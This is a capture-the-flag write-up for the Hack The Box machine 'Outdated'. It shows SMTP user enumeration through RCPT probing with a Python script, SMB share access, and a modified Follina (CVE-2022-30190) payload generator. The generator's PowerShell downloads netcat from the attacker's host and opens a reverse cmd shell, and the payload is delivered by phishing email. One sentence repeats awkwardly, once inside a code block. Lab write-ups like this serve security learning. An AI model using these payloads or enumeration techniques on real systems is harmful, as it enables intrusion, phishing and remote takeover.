### DNS Enum
We know about the domain name because the SMTP server discloses it  
```
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
```
so we can probe the DNS server for more information  
```
dig ANY @10.10.11.175 outdated.htb
dig ANY @10.10.11.175 outdated.htb +short
10.10.11.175
172.16.20.1
dc.outdated.htb.
dc.outdated.htb. hostmaster.outdated.htb. 228 900 600 86400 3600
dead:beef::108
dead:beef::6558:dffe:4c79:13ba
```

### SMTP Enumeration Tangent
The following wasn't necessarilly a very fruitfull for the enumeration of this box  
But it still was a good learning experience  
On a previos machine, (trick) I had written a very simple python script to enumerate users from a postfix server.  
And it worked by abusing the VRFY function.  
This server here seems to be something called hMailServer smtpd if Nmap fingerprinting is correct.  
As mentionned earyer the SMTP server, it discloses the domain name immediately on connectioni  
```
telnet outdated.htb 25
Trying 10.10.11.175...
Connected to outdated.htb.
Escape character is '^]'.
220 mail.outdated.htb ESMTP
EHLO mail.outdated.htb
250-mail.outdated.htb
250-SIZE 20480000
250-AUTH LOGIN
250 HELP
```

Unfortunately though the VRFY command is disallowed,  
So I won't be able to reuse the script I wrote from trick  
```
HELP
211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
VRFY asdf@asdf.org
502 VRFY disallowed.
```

Looking for other options in Hacktricks, I decide to give a try to the RCPT enumeration method   
and it looks like its gonna work  
```
MAIL FROM: asdf@asdf.org
250 OK
RCPT TO:asdf@outdated.htb
550 Unknown user
RCPT TO:itsupport@outdated.htb
250 OK
```

So at this stage I started writing silly python script to enumerate smtp users with RCPT.  
I ended up with this: 
```python
import socket
import os
import sys
import argparse
from time import sleep

class Smpt():
    def __init__(self, target, userlist, mailfrom, port=25):
        self.target = target
        self.userlist = userlist
        self.port = port
        self.mailfrom = [mailfrom, True]
        self.sock = None
        self.targetBanner = None

    def readUsers(self):
        with open(self.userlist, 'r') as file:
            users = file.read().strip().split('\n')
        self.userlist = users
        return

    def buildSock(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.target, self.port))
        self.sock = s
        banner = self.sock.recv(1024)[4::]
        if self.targetBanner == None:
            self.targetBanner = banner
        return

    def closeSock(self):
        self.sock.close()
        self.sock = None
        return

    def rcptProbe(self, mail):
        if self.mailfrom[1]:
            self.sock.send("EHLO all\r\n".encode())
            self.sock.recv(1024)
            self.sock.send(f"MAIL FROM:{self.mailfrom[0]}\r\n".encode())
            self.sock.recv(1024)
            self.mailfrom[1] = False
        self.sock.send(f"RCPT TO:{mail}\r\n".encode())
        response = self.sock.recv(1024).decode()
        if "250" in response:
            return True
        else:
            return False

if __name__ == "__main__":
    smtp = Smpt(
        target="10.10.11.175",
        userlist=sys.argv[1],
        mailfrom="asdf@asdf.org"
    )
    smtp.buildSock()
    smtp.readUsers()
    smtp.buildSock()
    print(smtp.targetBanner.decode())
    clear = "\033[K"
    green = "\033[32m"
    reset = "\033[m"
    for name in smtp.userlist:
        mail = name+"@outdated.htb"
        print(f"{mail}{clear}\r", end="")
        result = smtp.rcptProbe(mail)
        if result:
            print(f"\r{green}Found one:{reset} {mail}")
    smtp.closeSock()
```
I didn't find anyting more on this box, but I figured, it could still potentially be usefull in the future

```
I didn't find anyting more on this box, but I figured, it could still potentially be usefull in the future
python3 smtp_rcpt_brute.py words
mail.outdated.htb ESMTP

Found one: itsupport@outdated.htb
```
I didn't find anyting more on this box, but I figured, it could still potentially be usefull in the future
  
## SMB enum
back to actually trying to do something with the machine  
```
nbtscan 10.10.11.168
smbmap -H 10.10.11.175
smbmap -H 10.10.11.175 -u null -p null
smbmap -H 10.10.11.175 -u guest
```
```
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    READ ONLY       Remote IPC
NETLOGON                                                NO ACCESS       Logon server share
Shares                                                  READ ONLY
SYSVOL                                                  NO ACCESS       Logon server share
UpdateServicesPackages                                  NO ACCESS       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
WsusContent                                             NO ACCESS       A network share to be used by Local Publishing to place published content on this WSUS system.
WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.
```
We have access to "IPC$" and "Shares", IPC$ is apparently empty  
```
smbclient -U guest -N //10.10.11.175/Shares
smbclient --no-pass //10.10.11.175/Shares
```
but there a pdf in Shares
```
smb: \> ls
  .                                   D        0  Mon Jun 20 16:01:33 2022
  ..                                  D        0  Mon Jun 20 16:01:33 2022
  NOC_Reminder.pdf                   AR   106977  Mon Jun 20 16:00:32 2022

                9116415 blocks of size 4096. 1591614 blocks available

smb: \> get NOC_Reminder.pdf
getting file \NOC_Reminder.pdf of size 106977 as NOC_Reminder.pdf (159.3 KiloBytes/sec) (average 159.3 KiloBytes/sec)
```
From the pdf we get good indication that this is gonna be about sending a Follina payload to the support email

### CVE-2022-30190 - Follina
Lord John Hammond did a thing, and it's really nice:
[https://github.com/JohnHammond/msdt-follina](https://github.com/JohnHammond/msdt-follina)  
with the simplest args this generates a follina payload, and serves it over http on port 8000  
if we use the --reverse flag, it slaps a reverse shell payload into the follina ms-msdt thing 
and even opens a netcat listener for us to catch the shell
the code John wrote is actually fetching nc64.exe from his own github  
and uses that to call back from the victim's machine 
Of course this isn't gonna do the trick for us, since the victim doesn't have internet access  
So lets change the code slightly to host nc64.exe on our machine on another webserver on 9191  
```python3
if args.reverse:
        command = f"""Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""

    # Base64 encode our command so whitespace is respected
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")

    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )
```
generating the payload and starting the webserver and listener all at once  
```
./follina.py -i tun0 -r 9090
[+] copied staging doc /tmp/y9v6zrd8
[+] created maldoc ./follina.doc
[+] serving html payload on :8000
[+] starting 'nc -lvnp 9090'
listening on [any] 9090 ...
```
and starting the webserver on 9191 for netcat
```
python3 -m http.server 9191                               2 ⨯
Serving HTTP on 0.0.0.0 port 9191 (http://0.0.0.0:9191/) ...
```

Double checking how the payload was generated
```
curl -s http://10.10.14.43:8000|awk -F '+' '{print $9}'|tr -d "'"|base64 -d
Invoke-WebRequest http://10.10.14.43:9191/nc64.exe -OutFile C:\Windows\Tasks\nc.exe; C:\Windows\Tasks\nc.exe -e cmd.exe 10.10.14.43 9090
```

now the only thing left to do is to deliver the payload  
We'll do that by sending a link to our local webserver hosting the follina payload over email to the itsupport team.
```
swaks \
    --from asdf@asdf.htb \
    --to itsupport@outdated.htb \
    --header "Subject: asdfasdfasdfasdf" \
    --server mail.outdated.htb \
    --body 'http://10.10.14.43:8000'
```




```
Domain Name: OUTDATED
Domain Sid: S-1-5-21-4089647348-67660539-4016542185
```
